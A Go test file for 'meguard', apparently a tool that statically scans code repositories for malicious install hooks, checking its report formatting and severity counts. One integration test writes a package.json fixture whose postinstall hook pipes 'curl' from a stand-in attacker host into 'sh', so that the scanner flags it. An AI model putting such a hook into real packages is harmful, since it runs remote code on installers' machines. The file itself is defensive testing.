package cmd

import (
	"bytes"
	"context"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/IsraelGboluwaga/meguard/internal/analyze"
)

func TestPrintScanSectionNoFindings(t *testing.T) {
	var stdout, stderr bytes.Buffer
	printScanSection(&stdout, &stderr, analyze.Report{FilesScanned: 3, ASTDisabledReason: "needs a cgo build"})
	out := stdout.String()
	for _, want := range []string{
		"STATIC SCAN",
		"files scanned: 3",
		"AST analysis: disabled (needs a cgo build)",
		"findings: none",
	} {
		if !strings.Contains(out, want) {
			t.Errorf("scan section missing %q\n  got:\n%s", want, out)
		}
	}
}

func TestPrintScanSectionWithFindings(t *testing.T) {
	var stdout, stderr bytes.Buffer
	report := analyze.Report{
		FilesScanned: 1,
		Findings: []analyze.Finding{
			{Analyzer: "regex", Severity: analyze.High, File: "a.js", Line: 3, Message: "matches something bad", Snippet: "eval(...)"},
		},
	}
	printScanSection(&stdout, &stderr, report)
	out := stdout.String()
	if !strings.Contains(out, "findings: 1 (1 high)") {
		t.Errorf("expected a findings summary line, got:\n%s", out)
	}
	if !strings.Contains(out, "a.js:3") {
		t.Errorf("expected the finding location, got:\n%s", out)
	}
	if !strings.Contains(out, "eval(...)") {
		t.Errorf("expected the finding snippet, got:\n%s", out)
	}
}

func TestPrintScanSectionWarningsGoToStderr(t *testing.T) {
	var stdout, stderr bytes.Buffer
	report := analyze.Report{Errors: []string{"a.js: permission denied"}}
	printScanSection(&stdout, &stderr, report)
	if !strings.Contains(stdout.String(), "scan warnings: 1") {
		t.Errorf("expected a warning count on stdout, got:\n%s", stdout.String())
	}
	if !strings.Contains(stderr.String(), "a.js: permission denied") {
		t.Errorf("expected the warning detail on stderr, got:\n%s", stderr.String())
	}
}

func TestHighCriticalCount(t *testing.T) {
	report := analyze.Report{Findings: []analyze.Finding{
		{Severity: analyze.Info},
		{Severity: analyze.Medium},
		{Severity: analyze.High},
		{Severity: analyze.Critical},
	}}
	if got := highCriticalCount(report); got != 2 {
		t.Errorf("highCriticalCount = %d, want 2", got)
	}
}

func TestPrintScanSummaryLine(t *testing.T) {
	tests := []struct {
		name    string
		scanned bool
		report  analyze.Report
		want    string
	}{
		{"skipped", false, analyze.Report{}, "static scan: skipped (--no-scan)"},
		{"clean", true, analyze.Report{}, "static scan: clean (0 findings"},
		{
			name:    "findings",
			scanned: true,
			report:  analyze.Report{Findings: []analyze.Finding{{Severity: analyze.High}}},
			want:    "static scan: 1 finding(s) (1 high)",
		},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			var buf bytes.Buffer
			printScanSummaryLine(&buf, tt.scanned, tt.report)
			if out := buf.String(); !strings.Contains(out, tt.want) {
				t.Errorf("summary line = %q, want it to contain %q", out, tt.want)
			}
		})
	}
}

// TestRunScanExitsNonZeroOnHighFinding is an integration test for the
// container-less "meguard scan" path: a repo whose postinstall hook pipes a
// download into a shell must produce a High finding and a non-nil error, all
// without touching Docker.
func TestRunScanExitsNonZeroOnHighFinding(t *testing.T) {
	dir := t.TempDir()
	pkg := `{"scripts": {"postinstall": "curl -sSL https://evil.example/i.sh | sh"}}`
	if err := os.WriteFile(filepath.Join(dir, "package.json"), []byte(pkg), 0o644); err != nil {
		t.Fatal(err)
	}

	var stdout, stderr bytes.Buffer
	err := runScan(context.Background(), dir, &stdout, &stderr)
	if err == nil {
		t.Fatal("expected a non-nil error for a High finding")
	}
	if !strings.Contains(stdout.String(), "STATIC SCAN") {
		t.Errorf("expected the STATIC SCAN section on stdout, got:\n%s", stdout.String())
	}
}

// TestRunScanCleanRepoSucceeds asserts a clean repo exits 0 (nil error).
func TestRunScanCleanRepoSucceeds(t *testing.T) {
	dir := t.TempDir()
	if err := os.WriteFile(filepath.Join(dir, "index.js"), []byte("console.log('hi');\n"), 0o644); err != nil {
		t.Fatal(err)
	}

	var stdout, stderr bytes.Buffer
	if err := runScan(context.Background(), dir, &stdout, &stderr); err != nil {
		t.Errorf("expected a clean repo to succeed, got: %v", err)
	}
}
